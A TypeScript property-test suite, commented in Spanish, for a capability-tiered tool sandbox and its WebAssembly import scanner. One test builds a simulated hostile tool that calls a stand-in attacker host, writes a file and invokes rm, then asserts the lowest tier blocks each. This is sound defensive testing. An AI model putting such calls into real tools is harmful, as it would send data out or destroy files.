/**
 * L1 · Propiedades del sandbox.
 *
 * Los unitarios de L1 muestran casos concretos. Estas propiedades dicen que el
 * comportamiento se sostiene sobre todo el dominio, no sobre los casos que se me
 * ocurrieron.
 *
 * PRNG sembrado, por la misma razon que en L0: una suite que falla al azar
 * contradiria la propiedad del producto que esta suite protege.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { Rng } from './rng.js';
import { EFFECTS, TIERS, tierAllows, type Effect, type Tier } from '../src/axes.js';
import {
  CAPABILITIES,
  effectAllowed,
  grantsFor,
  requiresFor,
  type Capability,
} from '../src/sandbox/capability.js';
import { createPort } from '../src/sandbox/effects/create.js';
import { supports, highest, HOSTS, type HostEnvironment } from '../src/sandbox/tier.js';
import { runInSandbox } from '../src/sandbox/runner.js';
import { scanWasm } from '../src/sandbox/wasm/scan.js';
import { emptyContext } from '../src/context.js';
import type { ToolDescriptor, ToolOutput, Port } from '../src/contract.js';
import type { ToolImpl } from '../src/tool.js';
import { bytes, moduleWithImports, type RawImport } from './wasm-builder.js';

const SEEDS = [11, 23, 37, 41, 59, 71];
const OUT: Port = { name: 'out', produces: 'text', artifact: true };

function desc(tier: Tier): ToolDescriptor {
  return {
    id: 'p',
    version: '1.0.0',
    author: 'a',
    title: 'p',
    determinism: 'deterministic',
    tier,
    effect: 'none',
    inputs: [],
    outputs: [OUT],
  };
}

/** Tool pura de referencia: nunca toca el puerto. */
function pura(n: number): ToolImpl {
  return (input) => ({ ok: true, outputs: [{ port: 'out', value: (input['n'] as number) + n }] });
}

const HOST_POR_TIER: Record<Tier, HostEnvironment> = {
  T0: HOSTS.client,
  T1: HOSTS.clientFull,
  T2: HOSTS.backend,
};

test('L1-P11 · la regla granular coincide con la gruesa de L0 en los 12 pares', () => {
  for (const tier of TIERS) {
    for (const effect of EFFECTS) {
      assert.equal(effectAllowed(tier, effect), tierAllows(tier, effect));
    }
  }
});

test('L1-P12 · admitir un efecto es exactamente "todo lo que exige esta concedido"', () => {
  for (const tier of TIERS) {
    for (const effect of EFFECTS) {
      const concedido = new Set<string>(grantsFor(tier));
      const manual = requiresFor(effect).every((c) => concedido.has(c));
      assert.equal(effectAllowed(tier, effect), manual, `discrepancia en ${tier}/${effect}`);
    }
  }
});

test('L1-P13 · granted y requiresFor solo nombran capacidades declaradas', () => {
  const nombradas = new Set<string>(CAPABILITIES);
  for (const tier of TIERS) {
    for (const c of grantsFor(tier)) assert.ok(nombradas.has(c));
    for (const effect of EFFECTS) {
      for (const c of requiresFor(effect)) assert.ok(nombradas.has(c), `${effect} exige ${c}, que no existe`);
    }
  }
});

test('L1-P14 · el puerto anuncia exactamente lo que el tier otorga', () => {
  for (const tier of TIERS) {
    assert.deepEqual([...createPort(tier).granted], [...grantsFor(tier)]);
  }
});

test('L1-P15 · scanWasm nunca lanza, sobre bytes cualesquiera', () => {
  for (const seed of SEEDS) {
    const rng = new Rng(seed);
    for (let i = 0; i < 200; i++) {
      const len = rng.int(64);
      const crudo = new Uint8Array(len);
      for (let j = 0; j < len; j++) crudo[j] = rng.int(256);
      const v = scanWasm(crudo);
      assert.equal(typeof v.ok, 'boolean', 'siempre hay veredicto');
      assert.equal(v.violations.length === 0, v.ok, 'ok y violations no pueden discrepar');
    }
  }
});

test('L1-P16 · un modulo sin imports SIEMPRE pasa, uno con imports SIEMPRE falla', () => {
  for (const seed of SEEDS) {
    const rng = new Rng(seed);
    for (let i = 0; i < 60; i++) {
      const limpio = scanWasm(bytes(moduleWithImports([])));
      assert.equal(limpio.ok, true, 'cero imports es admisible');

      const cuantos = 1 + rng.int(3);
      const imports: RawImport[] = [];
      for (let k = 0; k < cuantos; k++) {
        imports.push({ module: `m${rng.int(9)}`, field: `f${rng.int(9)}`, kind: 0x00 });
      }
      const sucio = scanWasm(bytes(moduleWithImports(imports)));
      assert.equal(sucio.ok, false, 'cualquier import se rechaza bajo T0');
      assert.equal(sucio.violations.length, cuantos);
    }
  }
});

test('L1-P17 · scanWasm es puro: mismos bytes, mismo veredicto', () => {
  const modulos = [
    bytes(moduleWithImports([])),
    bytes(moduleWithImports([{ module: 'a', field: 'b', kind: 0x00 }])),
    new Uint8Array([0, 1, 2, 3]),
  ];
  for (const m of modulos) {
    const a = scanWasm(m);
    const b = scanWasm(m);
    assert.deepEqual(a.violations.map((v) => v.code), b.violations.map((v) => v.code));
    assert.equal(a.ok, b.ok);
  }
});

test('L1-P18 · DIFERENCIAL: una tool pura da el mismo valor bajo los tres tiers', () => {
  for (const seed of SEEDS) {
    const rng = new Rng(seed);
    for (let i = 0; i < 40; i++) {
      const n = rng.int(1000);
      const delta = rng.int(50);
      const valores = (['T0', 'T1', 'T2'] as const).map((tier) => {
        const r = runInSandbox({
          env: HOST_POR_TIER[tier],
          binding: { descriptor: desc(tier), impl: pura(delta) },
          input: { n },
          ctx: emptyContext('a'),
        });
        assert.equal(r.ok, true, `${tier} no puede negarse a ejecutar una tool pura`);
        return r.ok ? (r.outputs[0] as ToolOutput).value : null;
      });
      assert.equal(valores[0], valores[1]);
      assert.equal(valores[1], valores[2]);
      assert.equal(valores[0], n + delta);
    }
  }
});

test('L1-P19 · EXFILTRACION: cualquier efecto bajo T0 falla la ejecucion', () => {
  for (const seed of SEEDS) {
    const rng = new Rng(seed);
    const operaciones: (Capability | 'net' | 'fs' | 'proc')[] = ['net', 'fs', 'proc'];
    for (const op of operaciones) {
      const impl: ToolImpl = (_i, _c, fx) => {
        if (op === 'net') fx.net('https://atacante.dev');
        else if (op === 'fs') fx.fs('write', '/x', 'dato');
        else fx.proc(['rm']);
        return { ok: true, outputs: [] };
      };
      for (let i = 0; i < 10; i++) {
        const r = runInSandbox({
          env: HOSTS.client,
          binding: { descriptor: desc('T0'), impl },
          input: {},
          ctx: emptyContext(`a${rng.int(1000)}`),
        });
        assert.equal(r.ok, false, `T0 dejo pasar ${op}`);
        if (!r.ok) assert.equal(r.code, 'E_EFFECT_DENIED');
      }
    }
  }
});

test('L1-P20 · un host no sostiene un tier por encima del que sostiene', () => {
  const combos: HostEnvironment[] = [HOSTS.none, HOSTS.client, HOSTS.clientFull, HOSTS.backend];
  for (const env of combos) {
    const niveles = TIERS.map((t) => supports(env, t).ok);
    assert.equal(niveles[0], !niveles[1] || !niveles[2] ? niveles[0] : true);
    if (niveles[0] && niveles[1]) assert.ok(niveles[2] === false || env.microvm);
    assert.equal(highest(env), niveles[2] ? 'T2' : niveles[1] ? 'T1' : niveles[0] ? 'T0' : null);
  }
});

test('L1-P21 · el resultado no depende del orden de las claves del input', () => {
  const r1 = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: desc('T0'), impl: pura(1) },
    input: { a: 1, n: 41 },
    ctx: emptyContext('a'),
  });
  const r2 = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: desc('T0'), impl: pura(1) },
    input: { n: 41, a: 1 },
    ctx: emptyContext('a'),
  });
  assert.deepEqual(r1, r2);
});

test('L1-P22 · la bitacora crece de a uno y nunca se pierde un intento', () => {
  for (const seed of SEEDS) {
    const rng = new Rng(seed);
    const port = createPort('T1');
    const cuantos = 1 + rng.int(8);
    for (let i = 0; i < cuantos; i++) {
      const antes = port.attempts.length;
      port.net(`https://x${i}.dev`);
      assert.equal(port.attempts.length, antes + 1);
    }
    assert.equal(port.attempts.length, cuantos);
  }
});

test('L1-P23 · el sandbox no altera las salidas, y el sobre SI dice que corrio distinto', () => {
  // Lo que tiene que ser identico es la salida. Lo que tiene que DIFERIR es el
  // sobre, porque `tier` y `granted` son la declaracion de bajo que regla corrio.
  // Un sandbox que no los distinguiera estaria mintiendo sobre la propia corrida.
  for (const seed of SEEDS) {
    const rng = new Rng(seed);
    const delta = rng.int(100);
    const t0 = runInSandbox({
      env: HOSTS.client,
      binding: { descriptor: desc('T0'), impl: pura(delta) },
      input: { n: delta },
      ctx: emptyContext('a'),
    });
    const t2 = runInSandbox({
      env: HOSTS.backend,
      binding: { descriptor: desc('T2'), impl: pura(delta) },
      input: { n: delta },
      ctx: emptyContext('a'),
    });
    assert.equal(t0.ok, true);
    assert.equal(t2.ok, true);
    if (t0.ok && t2.ok) {
      assert.deepEqual(t0.outputs, t2.outputs, 'la salida no depende del sandbox');
      assert.equal(t0.tier, 'T0');
      assert.equal(t2.tier, 'T2');
      assert.deepEqual(t0.granted, []);
      assert.deepEqual(t2.granted, ['net', 'fs', 'process']);
    }
  }
});

test('L1-P24 · la capacidad `process` solo se concede donde hay kernel', () => {
  // `process` solo aparece donde hay kernel. Si un tier lo empezara a conceder
  // sin ser T2, la promesa del sandbox seria falsa.
  for (const tier of TIERS) {
    const tieneProcess = grantsFor(tier).includes('process');
    if (tieneProcess) assert.equal(tier, 'T2');
  }
  const conProcess = EFFECTS.filter((e: Effect) => requiresFor(e).includes('process'));
  assert.deepEqual([...conProcess], ['process']);
});